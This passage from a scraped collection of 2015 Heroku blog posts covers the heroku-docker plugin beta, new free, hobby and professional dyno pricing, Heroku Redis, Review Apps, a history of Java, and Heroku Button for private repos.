dependencies is still a major time-suck for developers — problems that are made worse by the need for local environments to match production so that bugs can be identified and fixed before deploying. Today, Heroku is releasing a beta version of heroku docker:release . This new CLI functionality leverages the increasing availability of Docker on the desktop, and combines the benefits of local container development with the proven Heroku Cedar container runtime. Using Docker and heroku docker:release , developers can run apps in containers similar to the Heroku runtime and get high fidelity dev/prod parity, whether they’re developing on OS X, Linux or Windows. How to use The new local dev experience ships as a Toolbelt plugin. Run the following command to install: heroku plugins:install heroku-docker The plugin requires a working Docker installation. We recommend boot2docker for users on OS X or Windows. The rest of this section assumes you’re on OS X. You can check your installation by running docker ps . Let’s start by grabbing the Heroku Node.js getting started sample, and creating a Dockerfile for it: $ git clone https://github.com/heroku/node-js-getting-started.git\n...\n$ cd node-js-getting-started\n$ heroku docker:init\nWrote Dockerfile (node) Your local Docker-based development environment is now initialized, and you can take a look at the Dockerfile written to the app directory. Notice that the Dockerfile derives from heroku/cedar-14 , the Docker image for Heroku’s newest runtime stack. The rest of the Dockerfile pulls in the appropriate Node.js runtime for your app and sets up the container. You can now run the app locally (you will probably see a different IP address): $ heroku docker:start\n...\nweb process will be available at http://192.168.59.103:3000/ Next, let’s install a new dependency for the app: $ heroku docker:exec npm install --save --no-bin-links cool-ascii-faces The npm install command is run inside an ephemeral Docker container that is torn down after the command completes. While npm install ran, the working directory was mounted inside the container, and node modules were installed for the app. You can verify this by running ls node_modules . Notice that no working Node or npm installation was required on your machine — these came courtesy of the Docker image created by Heroku. This also means that any node-modules with natively compiled binaries are built for Linux, and not for for the host operating system that you’re developing on. If you want, you can also deploy the app to Heroku from out of the Docker image you just created: $ heroku create\n...\n$ heroku docker:release\n…\n$ heroku open docker:release doesn’t use Heroku’s traditional Buildpack-based build system. Instead, it creates a Heroku-compatible slug from your local Docker image, and deploys it directly to Heroku. If you prefer the standard approach of git-pushing to Heroku and having production builds happen with buildpacks, then that works fine too. For details on how to use the plugin, see the Dev Center overview article . How it works The plugin consists of 3 components: The heroku/cedar:14 Docker image published in the Docker registry (this is the image that powers the Heroku Cedar-14 stack) Language specific Dockerfile templates that derive from the heroku/cedar:14 image (Node.js and Ruby currently supported, more to come) CLI commands that invoke Docker to run apps in containers These are the mechanics of the plugin: heroku docker:init will try to detect what language and framework is used for your app and in what versions, and write an appropriate Dockerfile. heroku docker:exec {command} builds image from Dockerfile (if one does not already exist) and runs it in a Docker container using docker run . It also mounts the working dir so that changes made by the command are persisted on your machine. heroku docker:start {command} bundles your source code into a self-contained Docker image and runs Procfile commands. Changes made to the container file system while running are not reflected on your machine. heroku docker:release starts the container and extracts the /app directory into a tarball that is deployed to Heroku using the Release API . The tarball includes both the language runtime and the source code for your app. At any point in the flow above, you can break out and run Docker commands directly. For example: docker images to list and manage the images created by the plugin docker ps to list running containers docker exec to run additional commands in a running container, eg. docker exec -ti {image-id} bash to get shell access to a running container Advanced uses When you run heroku docker:init , a Dockerfile is written to your app dir. You can modify this Dockerfile and rebuild images, for example to add binary dependencies to your container. See the Node.js guide for an example of how to bundle GraphicsMagick with a Node.js app and deploy it to Heroku . Note that you have to be careful to install extra stack components in the /app folder to get them deployed to Heroku. /app is the directory that’s mounted inside containers running on the platform. You can also add your own language templates and we welcome contributions. Check out the plugin /platforms directory for inspiration and feel free to send pull request if you get more languages working. The tar’ing approach from the release command is great for creating deployable slugs from scratch (i.e. not using buildpacks). If you’re currently creating slugs from scratch using OS X or Windows, using the plugin and heroku docker:release is a more dependable approach than trying to create Linux-compatible slugs from language binaries installed on those OS’s. Finally, the Cedar-14-based Docker images created by the plugin are self-contained and fully portable. If you want, you can run them on your own servers or on other platforms that have Docker support. See the Docker documentation on Dev Center for details. Summary Heroku has many years experience running containers securely and efficiently for our customers. We’re delighted that Docker is becoming a popular developer technology and for the promise this holds for bringing containers to a much greater audience. Docker and its ecosystem is an exciting, but new, development for our industry.  We are releasing this new feature as beta for adventurous users and there are still rough edges and bumps to be sanded down. As we evolve the Docker-based development workflow, we’re looking to ship more components of the Heroku platform as containers, for even better parity.  We look forward to your help and feedback in extending containers to this new area.", "date": "2015-05-05,"},
{"website": "Heroku", "title": "Heroku’s Free (as in beer) Dynos", "author": ["Peter van Hardenberg"], "link": "https://blog.heroku.com/heroku-free-dynos", "abstract": "Heroku’s Free (as in beer) Dynos Posted by Peter van Hardenberg May 07, 2015 Listen to this article Heroku comes from and is built for the developer community; the values of experimentation, openness and accessibility have been part of the product from day one, and continue to drive its development.  From our first days, we have provided a free tier that followed in the tradition of making it as easy and fun as possible for developers to learn and play, discover new technologies, and build new apps — and that's not changing.  It's as rewarding to us today as it was seven years ago to see experienced developers, students and hobbyist hackers use Heroku in that spirit every day. Free services have, and will continue to be, a key part of Heroku’s offering.  Today we are announcing the beta of a new free dyno. Just as the rest of the Heroku experience has evolved, the new free dyno is an evolution of our existing free offering, designed to be simpler and more straightforward to understand and use.  To that end, the new free dyno is exactly that — a distinct dyno type of its own.  In the previous free tier, users had a number of hours per month of a production dyno, the exact amount of which varied based on dyno type.  The behavior of an app, including when and how much it would sleep when not used, wasn’t a function of the type of dyno, but the number used.  And graduating from a free app to one that was always running was a big jump in price. With the free dyno, the model is much simpler, has more features, and is more accessible. \nUnder the old free offering, if your free app consisted of a web and a worker dyno, you had to keep track of your usage across both dynos, as well as scheduler usage, so as not to exceed your free dyno hour credits. With the new free services, you can build apps using both a web and worker dyno as well as scheduler, get more usage per app and never receive a surprise bill. This makes it easier at the free tier to build apps with modern patterns that separate front-end from background by using both a web and worker dyno. And as was the case before, apps using free dynos can have custom domains. Another important change has to do with dyno sleeping, or ‘idling’.  While non-paid apps have always slept after an activity timeout, some apps used automatic pinging services to prevent that behavior. free dynos are allowed 18 hours awake per 24 hour period, and over the next few weeks we will begin to notify users of apps that exceed that limit. With the introduction of the hobby dyno ($7 per month), we are asking to either let your app sleep after time out, or upgrade to this new option. The intention of making our free services simpler, and creating the new free dyno, is to encourage more free use of Heroku for innovation, learning and experimentation than ever before.  With these changes, the aim is to get more developers of every experience level to experiment and build new kinds of apps without ever having to pay. We're also releasing a number of other new dynos and pricing changes today. You can get the full details here . We look forward to your feedback on the new free and hobby dynos. dynos free", "date": "2015-05-07,"},
{"website": "Heroku", "title": "New Dyno Types and Pricing Public Beta", "author": ["Peter van Hardenberg"], "link": "https://blog.heroku.com/new-dyno-types-public-beta", "abstract": "New Dyno Types and Pricing Public Beta Posted by Peter van Hardenberg May 07, 2015 Listen to this article Today, we’re introducing a suite of new dynos. These dynos introduce new capabilities and price points and reduce the cost of scaling businesses on Heroku.  These new dynos enter beta today. We’ve always provided a developer experience so you can create amazing apps, from hacking on new technologies and personal projects to building production applications and the most demanding high traffic apps. As Heroku has evolved, you’ve asked us for more choices when it comes to features and pricing to better match how you’re using the platform. Customers with demanding production applications have asked us for professional features and prices that better support them as they scale. At the other end of the spectrum, developers have asked us for a more affordable price point for a dyno that never sleeps to run their personal projects 24x7. To better meet these needs, today we’re excited to announce new dyno types and pricing, available immediately in public beta: A new hobby dyno that never sleeps for $7 per dyno per month so you can more affordably run your personal projects 24x7 with all the ease of the Heroku developer experience. A new free dyno that allows you to run free apps consisting of 1 web, 1 worker and heroku run , and Heroku Scheduler. You can read more about the new free dyno here . Our 1X and 2X dynos are now $25 and $50 per dyno per month, respectively. These dynos are now named standard-1X and standard-2X and come with a set of professional features from the first dyno to support production applications. PX dynos are now $500 per dyno per month and are known as performance dynos. We believe these new dynos and pricing provide you a better set of choices when it comes to building and deploying apps. We plan to make these prices generally available next month, in June 2015.  All new apps created as of that date will be on the new pricing. While we are confident you will benefit from these new dynos, we want to provide you sufficient time to plan and adjust to these changes. As such, we will allow you to opt in any existing applications running more than a single 1X dyno at your convenience from now through the end of January 2016. Apps running only a single 1X dyno will be migrated to the new free dyno type beginning a month following GA. We’d love for you to head over to the dashboard and try them out, or you can keep reading for more details. Professional Dynos Starting today, running your business on Heroku is going to get a little more affordable. That’s because we’re upgrading our dynos and reducing their prices. For an application at scale, this new pricing can amount to as much as a 30% price cut. Old New Single-dyno apps sleep after 1hr dynos never sleep, Heroku Metrics from first dyno, faster builds, preboot 1X $0.05/hr ($36/mo) standard-1x $25/mo 2X $0.10/hr ($72/mo) standard-2x $50/mo PX $0.80/hr ($576/mo) performance $500/mo These new dynos are very similar to our traditional dynos with a few tweaks and changes. First, professional dynos never sleep, and always provide the detailed Heroku Metrics our users have come to trust. We’ve also upgraded git push heroku master performance, and made preboot available to all apps running professional dynos. Hobby and Free Dynos Heroku has always been home to a huge number of individual developers and their personal projects. Our users know how much easier it is to build software on Heroku. It doesn’t matter whether it’s an experiment with a new language, a fun weekend hack built around an API like Twilio , or a personal passion project that dreams of growing into the next big thing. Our new free and hobby dynos are designed to give individual developers more choices about how to build applications at a more intimate scale. The new hobby dyno is a response to several common requests from developers: a low-price dyno for under ten dollars a month, support for single dynos that never sleep, and an inexpensive option to take advantage of worker dynos. In fact, each new hobby dyno is only $7/month. The new free dynos are a response to another common request we’ve had, which is to allow developers to write and run small, part-time applications that include web, worker, and scheduled processes for free with no surprises. These free dynos are great for experimentation, pre-release projects, or even as the final home for lightly-used properties. Free Hobby Price $0 $7 Sleeping 30m inactivity never Awake time max 18hrs/day 24x7 Max dynos one web, one worker one per process type, max ten types Every app using free dynos can include not just a free web , but also one free worker , and free usage of heroku run and Heroku Scheduler. Free dynos can run up to eighteen hours a day, but have to “sleep” for at least the remaining six. That’s eighteen hours each of serving traffic, running a background worker, and scheduled processes. If you started working on your application bright and early at 7AM it would still be ready to hack on well after midnight. We’ve also lowered the sleep timer for free dynos to 30 minutes in order to help stretch that run time even further. Because your application doesn’t consume run time when it’s sleeping, the breaks both you and your program take during the day help keep your code working late into the night. As long as your application mostly sleeps when you do, you shouldn’t notice any difference at all. If you’re nervous that your free application might be over the 18 hour limit, don’t worry too much. We’ve looked at the numbers, and there are very few free applications on the platform that will see any change to the way they run as a result of these new dynos. The first time your application goes over 18 hours, we’ll send you an email, and you can see how much time your application has used in the last 24 hours by checking in the dashboard or the CLI. In order to give everyone time to get used to this new system, we’ll be running with the overage notifications in “warning-only” mode for at least the next two months. Plan for General Availability, Grandfathering and Migration The public beta is currently scheduled to run throughout May. The new dynos are scheduled to replace traditional dynos for all new applications in June, 2015. Paid applications running on traditional dynos on the “general availability” date will be able to migrate between new and traditional dynos at their convenience until the end of January, 2016. At this time, we are scheduled to sunset traditional dynos and migrate all remaining applications. Applications running a single 1X dyno that don’t accumulate any other dyno charges will be migrated gradually to the new free dynos beginning on July 1. Conclusion We’re all really excited here at Heroku to announce these new and improved dynos. We’re delighted to introduce price cuts for our professional and business users, new and affordable price points for individual developers, and new visibility and transparency into how your application runs. dynos free hobby professional", "date": "2015-05-07,"},
{"website": "Heroku", "title": "Heroku Redis Now Available in Public Beta", "author": ["Rimas Silkaitis"], "link": "https://blog.heroku.com/heroku-redis-now-available-in-public-beta", "abstract": "Heroku Redis Now Available in Public Beta Posted by Rimas Silkaitis May 12, 2015 Listen to this article Developers increasingly need a variety of datastores for their projects -- no one database can serve all the needs of a modern, scalable application.  For example, an e-commerce app might store its valuable transaction data in a relational database while user session information is stored in a key-value store because it changes often and needs to be accessed quickly.  This is a common pattern across many app types, and the need for a key-value store is especially acute.  Today, we are pleased to announce the beta of Heroku Redis , joining Heroku Postgres as our second data service. We have deep experience with Redis; internally at Heroku, we use Redis extensively as a queue, as a cache, and in a variety of other roles to complement Postgres and to build Heroku.  Redis’ high throughput, in-memory architecture and simplicity of interface via key-value semantics makes it ideal for building data-driven applications.  The beta of our Heroku Redis service adds to those native strengths a number of developer experience features that make it easy to utilize Redis at any scale, including performance analytics and metrics logs.  With these added usability features and the reliability developers have come to expect from Heroku, we believe you can build more powerful data-driven apps than ever before. Why Redis Redis is an in-memory, key-value datastore that has excellent support for all of the official languages on Heroku. It provides a few powerful data types and has a focus on maximizing throughput. By staying simple, and cutting away all of the complexity of a relational database system, Redis has been able to deliver incredible performance results. The entire dataset lives in RAM, and because there is no support for expensive table joins or other aggregate computations, response time is always fast. This simplicity comes at a cost. Redis lacks the durability guarantees of a more fully-featured database. We recommend you always store your valuable data in another system, and use Redis in a supporting role. Use Cases We use Redis extensively at Heroku , from monitoring our Heroku Postgres product and router logging to queueing up the build process for customers.  The flexibility that Redis provides has allowed us to build a distributed platform at scale.  This flexibility can be attributed to a great set of primitives that allows the application developer to build against unique use cases very quickly including: Job Queues: Queues are used extensively in web development to separate long-running tasks from the normal request-response cycle of the web server.  Redis has primitives like BLPOP that allow workers to wait for jobs to get pushed onto the queue.  This behavior has been popularized in libraries like Sidekiq . API Rate Limiting: If you have an API that provides data to developers, you might consider limiting the number of API calls that can be made at any one time so that your backend systems aren’t overrun.  Projects like redis-throttle allow Ruby developers to drop in rate limiting with little fuss. Session Storage: Every web app that wants to track users needs to store session information because HTTP is a stateless protocol.  Wherever the session is being saved, it needs to be looked up on every HTTP request.  Redis makes a great data store for session data because of its performance characteristics.  Projects like connect-redis for Node.js adds this ability via middleware. Share Resources Between Processes: Let’s say you’ve got multiple dynos trying to get exclusive access to the same resource. You can use a distributed lock in Redis so that only one process will ever have access at any one time.  Redis has documentation and a recommended algorithm called Redlock with implementations in Ruby , Python , PHP , and Java . Caching: Some data needs to be accessed quickly and very often.  This is one of the sweet spots for Redis.  Many web frameworks and runtimes, like Django , Rails , and Node.js , have drop-in extensions to use Redis as a cache. These are but a small sampling of the use cases that Redis can help you solve in your application.  With some quick searching you can find many more situations where Redis creates a lot of value including from the author of Redis himself, Salvatore 'antirez' Sanfilippo. Making Redis Even Better We wanted to take Heroku Redis beyond just providing it as a service.  We wanted to bring the same level of experience that developers expect from Heroku products and build that into something worthy of being called Heroku Redis.  We’ve created a number of features that make it easy to operate and maintain Redis at any scale.  The highlight of these features that we’re releasing at the start of the beta period includes our performance analytics and metrics logs. Our performance analytics comes as part of the web interface for Heroku Redis.  Developers will get insight into how their Redis is performing against its limits, like the amount of memory being used and the number of connections over time.  By having the historical information of how your Redis instance is performing, you’ll gain the ability to diagnose application issues or scale your Redis instance further. The other feature we’re launching during this beta is our metrics logs.  As applications get sufficiently large, developers tend to have their own monitoring frameworks like Librato to understand what’s happening across all aspects of the architecture.  The metrics logs provide the same information that you’d see in performance analytics but with much more granularity.  To see these events, you can find them in your application’s log stream: heroku logs -p heroku-redis -t Creating a Heroku Redis Instance Starting today, you can add the beta version of Heroku Redis to your application architecture: heroku addons:create heroku-redis:test What you’ll get is a Redis instance with 20MB of RAM and 20 concurrent client connections.  On top of that, you’ll get a REDIS_URL config var for your application to consume. If you are already using REDIS_URL in your application, the command will add a color config var like HEROKU_REDIS_YELLOW_URL .  Heroku Redis is free for the duration of the public beta and includes access to the Performance Metrics page in the Heroku Redis dashboard.  We recommend that developers wait for general availability before deploying Heroku Redis in a production environment. Building A Great Redis Experience During the public beta, we’re very interested in collecting feedback on Heroku Redis.  We are keenly focused on bringing an integrated Heroku developer experience across all of our data products before we reach general availability, so please try the beta and share your thoughts with us.  Once we get to GA, we’ll provide more details on the plan and pricing options.  In the meantime, if you have any ideas, comments, or support questions, the Redis team would love to hear from you . heroku-redis redis", "date": "2015-05-12,"},
{"website": "Heroku", "title": "Heroku Review Apps Beta", "author": ["Michael Friis"], "link": "https://blog.heroku.com/heroku_review_apps_beta", "abstract": "Heroku Review Apps Beta Posted by Michael Friis May 19, 2015 Listen to this article Today we’re announcing a feature that is going to change the way teams test and evaluate code changes. Continuous delivery works best when all team members — designers and testers included — can efficiently visualize and review the result of proposed changes. With Review Apps enabled, Heroku will spin up temporary test apps for every pull request that’s opened on GitHub, complete with fresh add-ons and other config required to make the app run. Instead of relying only on code reviews and unit tests run by CI, teams can use Review Apps to immediately try out and debug code branches in a production-like environment on Heroku. Review apps speed up team decision-making so that you can deliver better apps faster, and with greater confidence. The Review Apps feature builds on the GitHub Integration announced in February and combines two things in this world that are good and righteous: Heroku apps and the ease and speed of creating them from app.json templates GitHub pull requests for reviewing and discussing changes to source code This is great if you’re using GitHub Flow to propose, discuss and merge changes to your code. Because pull request branches are deployed to new apps on Heroku, it’s quick and simple for you and your collaborators to test and debug changes proposed in the PR and decide whether it’s ready to merge, needs more work or to close it because it’s not the experience you want. Read on below, or check the Dev Center docs for details . Setup Configuring review apps is simple: Find the app in Heroku Dashboard and select the “Deploy” tab Make sure the app is connected to a GitHub repo Find the Review apps section and hit “Enable Review Apps” You can use Review Apps in either manual or automatic mode. In manual mode, Heroku will display the PRs currently open on the repo and let you create apps for PRs that you want to test. In automatic mode, Heroku will immediately create apps for any PR opened on the repo. Heroku will keep apps updated as you push changes to branches and update the activity stream on GitHub with deploy notifications for the associated app, or post errors if a build or app-setup fails. Whether manual or automatic, Review Apps are torn down as soon the associated GitHub pull request is closed, so that no resources are wasted. See the Dev Center documentation for details on how to get started with Review Apps. How it works Review Apps is a deceptively simple feature: It combines the ease of Git branching and GitHub pull requests with the simplicity of spinning up new Heroku apps. Under the covers, however, we had to get a lot of things right to remove all manual tasks from the process of setting up a new app for every pull request opened: Templating app creation with app.json has to be expressive enough to fully specify what’s required for an app to run Builds have to be reliable and Buildpacks have to be able to create complete, working slugs from code written with a wide range of languages and frameworks Provisioning add-ons from any of Heroku’s 100+ partners must be fast and reliable Review Apps is a feature that’s hard to imagine outside of a Platform-as-a-Service like Heroku. Sophisticated development teams can commit time and resources to build and maintain custom scripts that do something similar, but without fungible containers and fast add-on provisioning, deploying every pull request opened on a repo is complicated and costly. With Heroku Review Apps, we’re bringing sophisticated and powerful continuous delivery flows to smaller teams and individual developers. Summary We’re using Review Apps extensively at Heroku and beta testers are also excited: Screenshots are all well and good, and seeing a diff of the code is great, but being able to fire up the new version of your app there and then in your browser to click through everything yourself takes visualising a change to a whole other level. — Coby Chapple Review apps are amazing for dealing the with the 'Sure the Pull Request passes tests and has clean code, but does its feature actually work?' problem. — Ian MacKinnon PR branches running in full-fledged Heroku apps will inform your team’s discussions because code changes can be easily tested and debugged by you and your team in a production-like environment. That will help you make better pull request review decisions, let testers, designers, product managers, and QA more easily test upcoming changes and ultimately let you deliver better tested and more reliable apps with Heroku. If you have feedback, suggestions or questions then please reach out to github-beta@heroku.com or sign up for the GitHub beta mailing list .", "date": "2015-05-19,"},
{"website": "Heroku", "title": "The Next Twenty Years of Java: Where We've Been and Where We're Going", "author": ["Joe Kutner"], "link": "https://blog.heroku.com/the_next_twenty_years_of_java_where_we_ve_been_and_where_we_re_going", "abstract": "The Next Twenty Years of Java: Where We've Been and Where We're Going Posted by Joe Kutner June 04, 2015 Listen to this article 1995 was the year AOL floppy disks arrived in the mail, Netscape Navigator was born and the first public version of Java was released. Over the next two decades, Java witnessed the multi-core revolution, the birth of the cloud, and the rise of polyglot programming. It survived these upheavals by evolving with them, and it continues to evolve even as we celebrate Java's twentieth birthday this year. But the JVM turning twenty doesn’t make it out-of-date. On the contrary, Java's evolution has lead to a kind of renaissance. That's why we sat down with RedMonk earlier this month to discuss Java's past, present, and future on the Opinionated Infrastructure Podcast . Our discussion centered around Java's role in a web native era, and how major businesses continue to adopt Java and alternative JVM Languages such as JRuby, Scala, Groovy and Clojure for their most critical systems. In this post, we'll add context to the Podcast discussion and the Java renaissance by retracing the history of the JVM. It’s a story of timing, struggle, competition, community and openness.  It contains lessons about software you can apply to your own organizations, and its path through history even hints at a vision for the future. Let’s take a look back at the first twenty years of Java. In the beginning… (1995-1998) Java began as an internal project at Sun Microsystems in the early 1990s. The company wanted to create a language for programming next-generation television sets and remote controls . But by the mid-1990s, it was already clear that the online-revolution was beginning. In 1995, the “Internet” and the “World-Wide-Web” became the same thing in most people’s minds. Yahoo! was founded, Powell’s Books started selling books online, and Pizza Hut launched an online delivery service. Fittingly, Sun changed direction to target the Web. Java hit the ground running in May of 1995, and within five months Oracle, Toshiba, Mitsubishi, Macromedia and Borland bought licenses . But the most notable endorsement of Java came from Netscape, which included the Java runtime in it’s free browser. At its peak, Netscape’s usage share was close to 90-percent , which meant Java had its foot-in-the-door in a big way. A few commercial products were built on Java’s Applets technology, but client-side Java never took off. Server-side programmers, however, loved the “Write Once, Run Anywhere” principle that Java embraced. They also benefited from Java’s automatic memory management, the absence of buffer overflow errors, and the rapid feedback provided by its interpreted runtime. The groundwork had been laid for Java on the server. Giant leaps and a bursting bubble (1998-2001) As Java matured, it became faster, more secure and more robust. Sun added a Just-In-Time (JIT) compiler, reflection and collections frameworks, database libraries, and the Swing graphical API. As a result, the runtime grew dramatically in size, which led to the release of Java 1.2 Micro Edition (J2ME), a compact runtime for mobile phones. But then the bottom fell out of the market. The dot-com bubble burst -- hitting Sun hard. The company’s stock fell to $10 per share from a high of nearly $250 per share . This was the beginning of the end for the once great Silicon Valley heavyweight. But despite Sun’s financial trouble, new Java releases continued to offer performance and security improvements to the platform. It was around this time that Sun created the Java Community Process (JCP) and the Java Certification Kit (JCK). The JCK was an effort to increase revenue from Java by charging alternative implementations, such as JRockit and Excelsior JET, for the right to call themselves “Java”. The JCK, which exists today as the Technology Compatibility Kit (TCK), would end up having profound consequences on Java in the coming years. Multiple cores and the benchmark wars (2001-2006) As the 2000s rolled on, the industry recovered from the bubble and the JCP seemed to be functioning well. Java Specification Requests (JSRs) for the addition of features such as IPv6 support, regular expressions, assertions , logging APIs , and new I/O libraries were implemented and released in Java 1.4. At about the same time, things were changing for chip manufacturers. Clock rate curves were flattening out, and the struggle to keep up with Moore’s Law became daunting. In 2004, Intel canceled its next-generation microprocessor project to focus on a dual-core chip. The future of the CPU was changing. For software developers, the multi-core revolution signaled the end of the “ free lunch ”. Applications would no longer be able to leverage increasingly faster chips, without changing any code, to provide better performance. Java reacted in a big way. In 2004, the release of Java 1.5 (a.k.a. Java 5.0) included an entirely new concurrency library . This new API and it’s underlying concurrency primitives made the JVM internals more efficient but also allowed Java developers to take advantage of multi-core CPUs within their applications. Java’s native threads, which could be scheduled by the operating system to run in parallel, made it possible for software performance to move in lock step with CPUs once again. But the engineers at Sun were not the only programmers working on JVM internals. A growing number of alternative Java implementations were under development by BEA and IBM. BEA’s runtime, JRockit, included a management console (which exists today as Java Mission Control), deterministic garbage collection, multi-tier support channels, and an arguably better memory model. The competition from these alternative JVMs led to improvements on all fronts. BEA, IBM and Sun challenged each other for dominance in the benchmarks of the day . The results included concurrent garbage collection, non-uniform memory access support, large page support, and heap compaction. Server-side Java performance was beginning to rival code written in C. But as Java was taking the world by storm, Sun continued to be very bad at making money. The company reported a decline in revenue for 12th consecutive quarters . It also made its share of strategic blunders. Politics and doldrums (2006-2010) The release of Java 1.6 (a.k.a. Java 6) was the last major Java release for five years. Sun was bleeding and desperately trying to assert control over it’s most valuable asset: Java. As a result, the JCP began to fall apart when it’s members opposed Sun over a licensing dispute. Sun’s Java License was too restrictive. It’s “field of use” clause prevented a truly open-source implementation of Java from being distributed by one of its licensees. This came to a head when the Apache Software Foundation (ASF) attempted to secure a license for its Harmony project. The end result was gridlock in the JCP, of which ASF was a member. But as Java languished, a new crop of JVM-based languages emerged. These languages leverage the fact that Java code is compiled into bytecode that is executed by the JVM. Thus, language designers were able to write their own compilers to generate JVM bytecode. One of the first, and most popular of these languages was JRuby . It exploited the concurrency features offered by the JVM to add new capabilities to the Ruby language, which was otherwise single-threaded. JRuby was soon followed by Groovy , Scala , Clojure and many others. Each language introduced features that were unique and unavailable in Java, allthewhile taking advantage of the performance and reliability of the JVM. Java was clearly still an industry leader, despite it’s lack of progress. As if to confirm that Sun’s only strength was Java, the company renamed its stock ticker to JAVA in 2007. But it was too little too late. In the first quarter of 2008, Sun posted losses of $1.68 billion while revenue fell by 7%. That November, the company announced plans to lay off nearly 6,000 people (18% of its workforce). IBM was the first to flirt with buying the company. But the final suitor was Oracle, which purchased Sun in June 2009 . While Sun’s demise was slow and painful, the end result could be considered positive. The new JVM-based languages signaled a bright future for Java as a platform. And the foundation had been laid for a truly open source implementation of Java despite the JCP in-fighting. As the decade came to a close, things were looking up for Java. A brave new world (2010-Today) In the wake of the JCP dispute over licensing, Sun created the OpenJDK project: an effort to implement a truly open source version of Java. While the engineers from Sun were settling into their new roles at Oracle, the OpenJDK project grew. By 2011, the project had the full support of Oracle, IBM, RedHat, Apple and others. These companies contributed better garbage collectors, management tools, and more. Open source Java had arrived. Java had its first release under Oracle nearly two years after Sun’s acquisition. Java 7 was somewhat lackluster, but it was the first Java release in which the reference implementation was free and open source under the GNU GPL License. One notable feature of Java 7 was a new bytecode instruction called invokedynamic . This instruction supported method invocations in the absence of static type information. Java is a statically typed language and couldn’t make use of this instruction in Java 7.  It was created specifically for dynamic languages such as JRuby and Groovy. The addition of invokedynamic was the first indication that alternative languages would get first class support on the JVM. Today, languages such as JRuby, Scala and Clojure are no longer considered emerging. They are used in production environments all over the globe . Developers adopt these languages to implement unique solutions to long standing problems. Business adopted these languages because they offer the same reliability and security as Java itself. The software world is changing, and Java is changing with it. Java’s biggest release ever came in 2014. Java 8 included new language features like Lambdas and Streams, improved date and time APIs, eliminated the long despised permanent-generation memory (memory that could not be reclaimed by the garbage collector), and introduced a new Javascript runtime called Nashorn. Nashorn is lightweight, high-performance, and leverages the invokedynamic instruction. It’s capable of running common Javascript tools, and may even run Node.js thanks to the Nodyn project . Nashorn is just one more example of how far Java has evolved since it’s early days. The JVM is a platform for a wide range of languages running on an even wider range of devices. Java is portable, flexible and open. And those are the characteristics that will define how it is used through the rest of the decade and beyond. The next twenty years When Oracle purchased Sun, nearly 6 years ago, most developers were skeptical of how it would affect the future of Java. Would Oracle narrow the scope of it’s openness? Would they hinder the community’s ability to contribute JSRs? Thus far, Oracle has upheld Sun’s promise of an open JVM. Today, Java is more accessible than ever, and the community is larger and more vibrant than it was in the Sun years. Oracle still maintains a strong grip on the “Java” name and API design, as demonstrated by the Oracle v. Google dispute , and the TCK is still a source of revenue. But Oracle has also funded extensive open source improvements to the OpenJDK project. Could Java be more open? Yes, but it’s hard to complain about it’s current status given the history we’ve reviewed. It has grown under Oracle -- both in openness and adoption. Today, the JVM runs on an estimated 89% of computers, 3 billion mobile phones, and 125 million TV devices . There are 9 Million Java developers worldwide and Java is at the top of the TIOBE Index . But Java is not the only JVM Language on the list. The TIOBE Index includes Scala, Groovy and Clojure. Alternative JVM languages are powering critical systems at Netflix , Twitter , LinkedIn , Square and Google . At Heroku, alternative JVM languages have become nearly as popular with our users as Java itself. Organizations are able to leverage these languages with little cost to tooling and without having to retrain an entire team of developers. The Java language will always be the flagship of the platform, but the future of the JVM is polyglot programming. Software developers are no longer content to solve all problems with a single language. The JVM enables developers to choose the right tool for the job and allows those tools to interoperate using a consistent and robust platform. While the languages used to implement JVM-based applications are growing, the JVM’s ability to run in more and more places is growing too. Java is powering the Internet of Things with it’s portability, and the next release of Java will further improve this capability. Project Jigsaw , a proposal for a modular JVM, will enable more compact runtimes that run on the smallest devices without giving up networking, database connectivity or other essential features. Java has become more than just a language. It is a platform, an API, and a community. Businesses trust the JVM with their most important and sensitive technologies. This is due to it’s maturity, reliability and security. Java is at the precipice of the next-generation of software and hardware. No matter what trends emerge, developers and businesses will look to Java as a platform that can to create innovative products.", "date": "2015-06-04,"},
{"website": "Heroku", "title": "Heroku Button for Private Repos", "author": ["Michael Friis"], "link": "https://blog.heroku.com/heroku_button_for_private_repos", "abstract": "Heroku Button for Private Repos Posted by Michael Friis June 11, 2015 Listen to this article Last year, we launched Heroku Button to make it simple for developers to deploy open source code to new Heroku apps. Open source contributors can add Heroku Buttons to GitHub READMEs, tutorials and blog posts and make their projects instantly deployable to Heroku, as apps fully provisioned with add-ons and other required configurations. Two months ago we introduced Elements where more than 1700 public Heroku Buttons are profiled alongside add-ons and top buildpacks. Today, we're happy to announce Heroku Buttons for projects maintained by your team in private GitHub repos. This new feature uses Heroku's GitHub integration to securely deploy code referenced by buttons on private repos. Buttons for private repos makes it simple to maintain private frameworks and quickstart template apps. Private repo buttons are great for: Onboarding new developers, contractors, and agencies to complex codebases with many dependencies that requires lengthy setup. Error-prone multi-step README getting-started sections can be replaced with a Heroku button that instantly configures an app on Heroku and deploys repo contents. Ensuring consistency when new projects are begun. Your team can maintain template apps for relevant languages, complete with app.json files specifying add-ons and config that comply with requirements for team projects. Profiling best practices by featuring buttons that deploy software and projects you are proud of in company newsletters and docs for colleagues to experiment with and learn from. Read on for details on how to add Heroku Buttons to private GitHub repos. Heroku Buttons for private GitHub repos work the same as public ones (though they will not be listed as a Heroku Element), and adding one is a simple two-step process: Add an app.json file Add the Heroku Button HTML or MarkDown to the README or doc where you want your button Note that you must specify a template URL parameter in the button link because GitHub does not send a referer header for private repos. Also note that if a Heroku user that’s not linked to a GitHub account tries to button-deploy a private repo, the user will be prompted to authenticate with GitHub. Check out the Heroku Button documentation for details \"Heroku's direct integration with the GitHub platform helps developers accelerate and simplify the application deployment process,” said Tim Clem, Product Manager GitHub Platform. “Any development team, whether they are in a startup or large enterprise can now deploy starter templates and apps with the Heroku Button for Private Repos in a single click.\" We're incredibly excited to bring Heroku Button to private GitHub repos, to let teams and companies make onboarding faster and more enjoyable, to foster greater project consistency and to promote and profile internal best practices.", "date": "2015-06-11,"},
